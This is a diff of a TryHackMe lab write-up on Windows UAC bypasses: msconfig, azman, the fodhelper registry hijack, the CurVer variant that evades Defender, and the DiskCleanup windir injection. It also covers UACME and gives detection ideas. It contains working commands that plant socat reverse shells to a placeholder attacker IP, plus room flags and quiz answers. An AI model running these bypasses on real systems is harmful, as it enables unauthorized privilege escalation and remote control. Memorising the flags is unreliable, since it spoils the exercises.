@@ -8,35 +8,52 @@ This room covers how to bypass User Account Control (UAC) on Windows — the mec
 > **Platform:** TryHackMe
 
 ---
+## Task 1 — Introduction
 
-## How UAC actually works
+UAC is a security feature that forces every new process to run with a low-privilege token by default, regardless of whether it was launched by a standard user or an administrator. The interesting bit going in: Microsoft doesn't actually classify UAC as a security boundary, just a convenience mechanism — which is why most of the bypasses in this room are publicly known and still work on unpatched systems.
 
-Every process on Windows runs with an access token that has an assigned **Integrity Level (IL)**. This is Mandatory Integrity Control (MIC), and it's evaluated *before* the standard DACL — meaning your permissions on paper don't matter if your IL is too low.
+
+---
+
+## Task 2 — User Account Control (UAC)
+
+Every process on Windows carries an **Integrity Level (IL)** as part of Mandatory Integrity Control (MIC). MIC is checked *before* the standard DACL, so having the right permissions on paper doesn't help if your IL is too low.
 
 The four levels, low to high:
 
-- **Low** — internet-facing stuff, e.g. IE, barely any permissions
+- **Low** — internet-facing processes (e.g. IE), almost no permissions
 - **Medium** — standard users, and admins' filtered tokens
-- **High** — admins' elevated tokens (or all admin tokens if UAC is off)
-- **System** — OS-level only
+- **High** — admins' elevated tokens (or all admin tokens if UAC is disabled)
+- **System** — reserved for the OS
 
-Here's the part that trips people up: administrators don't get one token, they get two. A **filtered token** at Medium IL used for everyday stuff, and an **elevated token** at High IL that only gets used once you click through the UAC prompt. So even if you land a shell as a local admin, you're almost certainly sitting at Medium IL — you can confirm this with:
+The part that catches people out: administrators get **two** tokens at logon, not one. A **filtered token** at Medium IL for everyday use, and an **elevated token** at High IL that only gets attached once the user clicks through the UAC prompt. So even landing a shell as a local admin usually means sitting at Medium IL — confirmed with:
 
 ```
 whoami /groups | find "Label"
 ```
 
-If you see `Mandatory Label\Medium Mandatory Level`, you're stuck with the filtered token, and things like `net user /add` will throw `Access is denied` even though you're technically in the Administrators group.
+If it shows `Mandatory Label\Medium Mandatory Level`, you're on the filtered token, and admin-only actions like `net user /add` will fail with `Access is denied`.
 
-Elevation itself is handled by the **Application Information Service (Appinfo)**. When something needs to run elevated, the request goes to Appinfo, which checks the app's manifest for auto-elevate eligibility, then (if needed) pops `consent.exe` on a secure desktop for the user to approve. Once approved, Appinfo runs the process with the elevated token and re-parents it back to the shell that requested it.
+Elevation itself is brokered by the **Application Information Service (Appinfo)**. A request to run something elevated goes to Appinfo, which checks the target's manifest for auto-elevate eligibility, then — if interactive approval is needed — launches `consent.exe` on a secure desktop. Once approved, Appinfo runs the process with the elevated token and re-parents it back to the calling shell.
 
-The notification levels (Control Panel > UAC settings) matter less than people think — the bottom three are functionally identical from an attacker's perspective. Only **Always Notify** changes anything, since it forces a prompt even for auto-elevating binaries, which kills most of the tricks below.
+UAC's notification levels matter less than expected — the bottom three settings are functionally identical to an attacker. Only **Always Notify** changes anything, since it forces a prompt even for auto-elevating binaries, which shuts down most of the tricks later in this room.
+
+**Answer the questions below**
+
+**What is the highest integrity level (IL) available on Windows?**
+`System`
+
+**What is the IL associated with an administrator's elevated token?**
+`High`
+
+**What is the full name of the service in charge of dealing with UAC elevation requests?**
+`Application Information Service`
 
 ---
 
-## Bypass #1 & #2: GUI abuse of auto-elevating binaries
+## Task 3 — UAC: GUI based bypasses
 
-Some signed Microsoft binaries in trusted paths (`System32`, `Program Files`) are allowed to auto-elevate without ever showing a UAC prompt — you can confirm this by checking a binary's manifest with Sysinternals `sigcheck`:
+Some signed Microsoft binaries living in trusted paths (`System32`, `Program Files`) are allowed to **auto-elevate** — run at High IL without ever showing a UAC prompt. You can confirm this on a given binary with Sysinternals `sigcheck`:
 
 ```
 sigcheck64.exe -m c:\windows\system32\msconfig.exe
@@ -44,27 +61,47 @@ sigcheck64.exe -m c:\windows\system32\msconfig.exe
 
 which shows `<autoElevate>true</autoElevate>` right in the manifest.
 
-**msconfig.exe** is the easy case. Open it, check it in Process Hacker, and you'll see it's already running at High IL despite no prompt ever appearing. It also happens to have a built-in way to spawn a shell — under the **Tools** tab there's a "Launch" button that opens `cmd.exe`. Since that shell is spawned from msconfig's process, it inherits the same High IL token.
+### Case study: msconfig.exe
+
+Open `msconfig`, check it in Process Hacker, and it's already running at High IL despite no prompt ever appearing. It also happens to have a built-in way to spawn a shell — under the **Tools** tab there's a "Launch" option that opens `cmd.exe`. Since that shell is spawned from msconfig's process, it inherits the same High IL token.
 
 ```
 C:\> C:\flags\GetFlag-msconfig.exe
 ```
 
-**azman.msc** (Authorization Manager) auto-elevates the same way (all `.msc` snap-ins run through `mmc.exe`), but it doesn't have an obvious shell built in. The workaround: open the Help menu, right-click anywhere in the help content, and choose **View Source** — this spawns Notepad. From Notepad, go to File > Open, switch the file filter to "All Files", browse to `System32`, find `cmd.exe`, and right-click > Open instead of double-clicking. That cmd.exe inherits the High IL token from the mmc.exe process tree, which you can verify in Process Hacker.
+### Case study: azman.msc
+
+`azman.msc` (Authorization Manager) auto-elevates the same way — all `.msc` snap-ins run through `mmc.exe` — but it doesn't have an obvious built-in shell. The workaround: open the Help menu, right-click anywhere in the help content, and select **View Source**, which spawns Notepad. From Notepad, go to **File > Open**, switch the file type filter to "All Files", browse to `C:\Windows\System32`, find `cmd.exe`, and **right-click > Open** instead of double-clicking. That `cmd.exe` inherits the High IL token from the `mmc.exe` process tree — visible in Process Hacker's process tree view.
 
 ```
 C:\> C:\flags\GetFlag-azman.exe
 ```
 
+**Questions**
+
+**Q1. What flag is returned by running the `msconfig` exploit?**
+
+**Answer:** `THM{UAC_HELLO_WORLD}`
+
 ---
 
-## Bypass #3: fodhelper.exe (registry hijack)
+**Q2. What flag is returned by running the `azman.msc` exploit?**
 
-This is the one that actually matters operationally, because unlike msconfig/azman it doesn't need GUI access — it works from a plain remote shell. It's also been used in the wild by the Glupteba malware family.
+**Answer:** `THM{GUI_UAC_BYPASSED_AGAIN}`
 
-`fodhelper.exe` is auto-elevating and, when it runs, it resolves a command through the `ms-settings` ProgID in the registry. The key detail: `HKEY_CLASSES_ROOT` is a merge of `HKLM\Software\Classes` (system-wide) and `HKCU\Software\Classes` (per-user) — and **HKCU wins** if both exist. So any unprivileged user can plant a per-user override for `ms-settings` and control what fodhelper actually executes, without needing write access to HKLM.
+---
 
-From a Medium IL shell (admin group member, default UAC settings):
+## Task 4 — UAC: Auto-Elevating Processes
+
+To auto-elevate, a Windows executable generally needs to be signed by the Windows Publisher, live in a trusted directory, and either declare the `autoElevate` manifest element, be on Microsoft's internal auto-elevate allowlist, or be an `.msc` snap-in hosted by `mmc.exe`.
+
+### Fodhelper
+
+`fodhelper.exe` (Windows optional features manager) auto-elevates, and unlike msconfig/azman, it can be abused **without any GUI access** — which makes it viable from a plain remote shell. This technique has been used in the wild by the Glupteba malware family.
+
+The root cause is how `fodhelper` resolves its command: through the `ms-settings` ProgID in the registry. `HKEY_CLASSES_ROOT` is a merge of two paths — `HKLM\Software\Classes` (system-wide) and `HKCU\Software\Classes` (per-user) — and **HKCU takes priority** if both exist. That means any unprivileged user can plant a per-user override for `ms-settings` and control what fodhelper actually runs, no HKLM write access needed.
+
+From a Medium IL shell, already a member of Administrators, default UAC settings:
 
 ```cmd
 set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
@@ -76,44 +113,65 @@ reg add %REG_KEY% /d %CMD% /f
 fodhelper.exe
 ```
 
-The empty `DelegateExecute` value matters — without it Windows ignores your hijacked command entirely and falls back to the default.
+The empty `DelegateExecute` value is required — without it, Windows ignores the hijacked command and falls back to the default association.
 
-Catch the shell on your listener, and confirm the IL:
+Catch the shell on the listener, confirm the IL:
 
 ```
 whoami /groups | find "Label"
 Mandatory Label\High Mandatory Level
 ```
 
-```
-C:\> C:\flags\GetFlag-fodhelper.exe
-THM{AUTOELEVATE4THEWIN}
-```
-
-Clean up before moving on, or the leftover key can interfere with later steps:
+Cleanup before continuing:
 
 ```cmd
 reg delete HKCU\Software\Classes\ms-settings\ /f
 ```
+**Questions**
+
+**What flag is returned by running the fodhelper exploit?**
+
+**Answer:** `THM{AUTOELEVATE4THEWIN}`
 
 ---
 
-## Bypass #4: fodhelper with Defender enabled
+## Task 5 — UAC: Improving the Fodhelper Exploit to Bypass Windows Defender
 
-With Defender turned on, the exploit above gets caught almost instantly — you'll see an alert referencing the registry modification, and the key gets wiped within about a second.
+With Windows Defender enabled, the exploit above gets caught almost immediately. The moment the registry value is set, a Defender notification pops up flagging a UAC bypass attempt via registry modification, and querying the key afterward shows it's already been wiped:
 
-First attempt: chain the reg write and the fodhelper call together and hope you win the race before Defender remediates:
+```
+reg query %REG_KEY% /v ""
+(Default)    REG_SZ    (value not set)
+```
+
+### Attempt 1 — racing Defender
+
+Chaining the reg write with an immediate query shows the command is briefly written intact before Defender remediates it a moment later:
+
+```cmd
+reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY%
+```
+
+So the natural next step is to run `fodhelper.exe` immediately after setting the key, betting on winning the race before Defender acts:
 
 ```cmd
 reg add %REG_KEY% /v "DelegateExecute" /d "" /f
 reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
 ```
 
-It sometimes works, but it's a coin flip and Defender still alerts either way — not something you'd rely on.
+This sometimes works, but it's unreliable — pure timing luck — and Defender still raises the alert regardless of whether the payload executed. Not something to depend on.
 
-A cleaner variant (credit to **@V3ded**) avoids touching the `ms-settings` command path directly. Instead, it creates a brand-new, arbitrarily named ProgID with its own payload, and points `ms-settings\CurVer` at that new ProgID. `CurVer` is a legitimate mechanism Windows uses to redirect a file type to its "current version," and fodhelper follows that redirection without question.
+### Attempt 2 — CurVer indirection
 
-The PowerShell version of this is still signature-detected by Defender:
+A better approach, proposed by **@V3ded**, avoids writing to the `ms-settings` command path directly. Instead, it uses the `CurVer` registry entry, which Windows normally uses to point a file type at the "current version" of an application:
+
+1. Create a **new, arbitrarily named ProgID** with its own payload under `Shell\Open\command`.
+2. Point `ms-settings\CurVer` at that new ProgID.
+
+When fodhelper opens `ms-settings`, it follows the `CurVer` redirection to the new ProgID and uses its associated command — meaning the payload no longer has to sit in a location Defender is specifically watching.
+
+PowerShell version (still gets flagged by Defender):
 
 ```powershell
 $program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
@@ -127,7 +185,7 @@ Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 ```
 
-But translate the exact same logic into plain `cmd.exe`, and Defender doesn't flag it at all:
+Translate the exact same logic into plain `cmd.exe`, though, and Defender doesn't alert at all — the detection was written against the published PowerShell PoC, not the underlying technique:
 
 ```cmd
 set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
@@ -139,11 +197,9 @@ fodhelper.exe
 ```
 
 ```
-C:\> C:\flags\GetFlag-fodhelper-curver.exe
-THM{AV_UAC_BYPASS_4_ALL}
+whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level
 ```
-
-Worth calling out: the fact that changing the *scripting language* alone was enough to slip past detection says a lot about how narrow static AV signatures can be — they were written against the published PoC, not the underlying technique. Detection built around registry key locations and process ancestry (e.g., a shell spawned as a child of `fodhelper.exe`) holds up a lot better than string/hash matching.
 
 Cleanup:
 
@@ -151,22 +207,40 @@ Cleanup:
 reg delete "HKCU\Software\Classes\.thm\" /f
 reg delete "HKCU\Software\Classes\ms-settings\" /f
 ```
+**Questions**
 
+**What flag is returned by running the fodhelper-curver exploit?**
+
+**Answer:** `THM{AV_UAC_BYPASS_4_ALL}`
 ---
 
-## Bypass #5: DiskCleanup scheduled task + environment variable injection
+## Task 6 — UAC: Environment Variable Expansion
 
-Everything above depends on auto-elevating binaries, which stop working the moment UAC is set to **Always Notify**. Scheduled tasks sidestep this entirely, because by design they're meant to run without any user interaction regardless of the UAC level.
+Every bypass so far relies on auto-elevating binaries, which stop working once UAC is set to **Always Notify** — fodhelper and similar apps would then require the user to go through the prompt like anything else. Scheduled tasks sidestep this entirely, since by design they run without user interaction independent of the UAC level.
 
-The target here is `\Microsoft\Windows\DiskCleanup\SilentCleanup`. Opening it in Task Scheduler shows two relevant settings: it runs as the **Users** account (inherits the caller's context), and it has **"Run with highest privileges"** enabled — which for an admin means it grabs the High IL elevated token automatically, no prompt required.
+### Case study: Disk Cleanup scheduled task
 
-Its action is:
+The target is `\Microsoft\Windows\DiskCleanup\SilentCleanup`. Checking it in Task Scheduler shows it's configured to run as the **Users** account (inherits the calling user's context) with **"Run with highest privileges"** enabled — for an administrator, that means it grabs the High IL elevated token automatically, no prompt involved. For a non-admin user, this same task would only run at Medium IL, since that's the highest token available to them, which is why this specific technique only works for accounts already in the Administrators group.
+
+Its configured action:
 
 ```
 %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
 ```
 
-Since that command is built by expanding environment variables, and `%windir%` can be overridden per-user via `HKCU\Environment`, you can hijack the whole thing:
+Since that command depends on environment variable expansion, and `%windir%` can be overridden per-user via `HKCU\Environment`, the whole command can be hijacked:
+
+```
+"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "
+```
+
+The trailing `&REM ` comments out whatever the original command expands to after `%windir%`, so only the payload actually runs:
+
+```
+cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
+```
+
+Putting it together, from the backdoor shell:
 
 ```cmd
 reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
@@ -174,57 +248,67 @@ reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe T
 schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
 ```
 
-The `&REM ` at the end comments out the rest of the original command once `%windir%` is expanded, so what actually runs is just your payload:
-
 ```
-cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
-```
-
-```
-C:\> C:\flags\GetFlag-diskcleanup.exe
-THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}
+whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level
 ```
 
-**Don't skip this cleanup step** — a huge number of Windows components depend on `%windir%`, and leaving it overridden will break things on the box:
+Cleanup — **don't skip this one**, since a lot of Windows components depend on `%windir%` and will break until it's reverted:
 
 ```cmd
 reg delete "HKCU\Environment" /v "windir" /f
 ```
+**Questions**
+
+**What flag is returned by running the DiskCleanup exploit?**
+
+**Answer:** `THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}`
 
 ---
 
-## Automating it: UACME
+## Task 7 — Automated Exploitation
 
-[UACME](https://github.com/hfiref0x/UACME) by @hfiref0x packages most known UAC bypasses into one tool. The `Akagi` component runs a bypass by method number:
+[UACME](https://github.com/hfiref0x/UACME) by @hfiref0x packages most known UAC bypasses into a single tool. Its `Akagi` component runs a given bypass by method number:
 
 ```cmd
 cd C:\tools
 UACME-Akagi64.exe 33
 ```
 
-The three techniques from this room map to:
+The techniques covered in this room map to:
 
-- `33` — fodhelper.exe (direct registry hijack)
-- `34` — DiskCleanup scheduled task
-- `70` — fodhelper.exe via CurVer
+| Method ID | Technique |
+|---|---|
+| 33 | fodhelper.exe (direct registry hijack) |
+| 34 | DiskCleanup scheduled task |
+| 70 | fodhelper.exe via CurVer registry key |
 
-It's a great tool for quickly checking whether a technique still works on a given build, but running it as-is against a real target gets flagged by pretty much any modern EDR. The value of walking through the manual steps above is that it lets you build your own variants when the canned tooling gets burned.
+Handy for quickly checking whether a technique still works on a given build, but running it unmodified against a real target is trivially signatured by any modern AV/EDR. Knowing the manual steps behind each method is what actually lets you build a variant that survives contact with real defenses — as shown in Task 5.
+
+No questions in this task.
 
 ---
 
-## MITRE ATT&CK
+## Task 8 — Conclusion
 
-- **T1548.002** — Abuse Elevation Control Mechanism: Bypass User Account Control (covers all of the above)
+UAC bypasses keep coming back to the same two root causes: auto-elevating binaries that trust their environment more than they should, and per-user registry precedence (`HKCU` beating `HKLM`) that lets a low-privilege process redirect what a high-privilege one actually runs. Since Microsoft doesn't treat this as a patchable security boundary, none of it is going away — which makes detection engineering, not patching, the realistic long-term mitigation.
+
+A few things that would actually catch this on a monitored host:
+
+- Set UAC to **Always Notify** — kills the fodhelper-class bypasses outright.
+- Sysmon Event ID 13 (registry value set) on writes to `HKCU\Software\Classes\ms-settings\Shell\Open\command` or `ms-settings\CurVer`, correlated with a child process of `fodhelper.exe`.
+- Alert on writes to `HKCU\Environment`, especially `windir` — normal users never touch this key.
+- Flag manual/on-demand execution of `SilentCleanup` outside its normal scheduled trigger.
+- Watch for `cmd.exe` or `powershell.exe` spawned as a child of `fodhelper.exe`, `mmc.exe`, or `cleanmgr.exe` — none of these should normally spawn an interactive shell.
+- Don't lean purely on static signatures — Task 5 showed that swapping PowerShell for `cmd.exe` alone was enough to slip past Defender. Registry location and process lineage hold up far better than payload content.
+
+No questions in this task.
+
+---
+
+## MITRE ATT&CK mapping
+
+- **T1548.002** — Abuse Elevation Control Mechanism: Bypass User Account Control
 - **T1053.005** — Scheduled Task/Job: Scheduled Task (DiskCleanup abuse)
 
-## Detection ideas
-
-A few things that would catch most of this on a monitored host:
-
-- Set UAC to **Always Notify**. This alone kills the fodhelper-class bypasses and forces an attacker toward the scheduled-task route.
-- Sysmon Event ID 13 (registry value set) on writes to `HKCU\Software\Classes\ms-settings\Shell\Open\command` or `HKCU\Software\Classes\ms-settings\CurVer`, especially if followed by a child process of `fodhelper.exe`.
-- Watch for writes to `HKCU\Environment`, particularly `windir` — normal users never touch this.
-- Alert on manual/on-demand execution of `SilentCleanup` outside its normal scheduled trigger.
-- Generally, flag `cmd.exe` or `powershell.exe` spawned as a child of `fodhelper.exe`, `mmc.exe`, or `cleanmgr.exe` — none of these should normally spawn an interactive shell.
-- Don't rely purely on static signatures — as shown above, changing the scripting language alone was enough to evade Defender. Process lineage and registry location are more durable signals than payload content.
-
+---
